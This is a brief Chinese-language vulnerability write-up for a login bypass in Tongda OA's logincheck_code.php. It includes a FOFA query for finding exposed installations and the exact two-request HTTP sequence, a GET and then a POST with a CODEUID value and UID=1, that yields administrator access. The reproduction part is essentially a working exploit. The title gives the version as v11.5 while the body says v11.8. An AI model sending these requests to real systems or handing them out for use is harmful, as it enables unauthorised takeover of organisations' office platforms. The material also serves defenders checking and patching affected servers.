# 通达OA v11.5 logincheck\_code.php 登陆绕过漏洞

## 漏洞描述

通达OA v11.8 logincheck\_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台

## 漏洞影响

```plain
通达OA v11.8
```

## FOFA

```plain
app="TDXK-通达OA"
```

## 漏洞复现

登陆页面

![202205201539126.png](/uploads/20260518/13616895-ac08-488e-9082-c695ad04185d.png)

发送第一个请求包

```plain
GET /general/login_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
```

```plain
POST /logincheck_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1
```
